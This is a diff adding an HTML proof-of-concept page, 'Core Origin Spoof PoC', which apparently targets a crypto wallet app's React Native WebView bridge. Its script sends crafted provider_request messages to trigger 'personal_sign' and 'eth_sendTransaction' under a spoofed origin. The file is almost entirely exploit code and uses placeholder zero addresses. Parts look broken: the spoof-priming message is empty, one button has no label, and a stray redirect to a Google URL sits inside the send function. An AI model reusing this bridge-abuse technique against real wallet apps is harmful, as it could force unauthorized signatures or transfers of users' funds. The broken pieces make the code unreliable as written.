@@ -1,0 +1,92 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Core Origin Spoof PoC</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 20px; }
+    button { margin: 6px 0; padding: 10px 14px; }
+    pre { background: #111; color: #0f0; padding: 12px; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h2>Core Origin Spoof</h2>
+
+  <button id="btnPrime"></button><br/>
+  <button id="btnSign">1) personal_sign</button><br/>
+  <button id="btnSend">2) eth_sendTransaction</button>
+
+  <pre id="log"></pre>
+
+  <script>
+    const logEl = document.getElementById('log');
+    function log(msg) {
+      const line = `[${new Date().toISOString()}] ${msg}`;
+      logEl.textContent += line + "\n";
+      console.log(line);
+    }
+
+    function postToRN(obj) {
+    location="https://www.google.com/csi"
+      if (!window.ReactNativeWebView || !window.ReactNativeWebView.postMessage) {
+        return;
+      }
+      window.ReactNativeWebView.postMessage(JSON.stringify(obj));
+      log('sent -> ' + JSON.stringify(obj));
+    }
+
+    function primeSpoofContext() {
+      postToRN({
+      });
+    }
+
+    document.getElementById('btnPrime').onclick = () => {
+      primeSpoofContext();
+    };
+
+    document.getElementById('btnSign').onclick = () => {
+      primeSpoofContext();
+      setTimeout(() => {
+        postToRN({
+          method: 'provider_request',
+          payload: JSON.stringify({
+            id: 1337,
+            request: {
+              method: 'personal_sign',
+              params: [
+                '0x48656c6c6f2066726f6d206f726967696e2073706f6f6620706f63',
+                '0x0000000000000000000000000000000000000000'
+              ]
+            }
+          })
+        });
+      }, 200);
+    };
+
+    document.getElementById('btnSend').onclick = () => {
+      primeSpoofContext();
+      setTimeout(() => {
+        postToRN({
+          method: 'provider_request',
+          payload: JSON.stringify({
+            id: 1338,
+            request: {
+              method: 'eth_sendTransaction',
+              params: [{
+                from: '0x0000000000000000000000000000000000000000',
+                to: '0x0000000000000000000000000000000000000000',
+                value: '0x0',
+                data: '0x',
+                gas: '0x5208'
+              }]
+            }
+          })
+        });
+      }, 200);
+    };
+
+  </script>
+</body>
+</html>
+
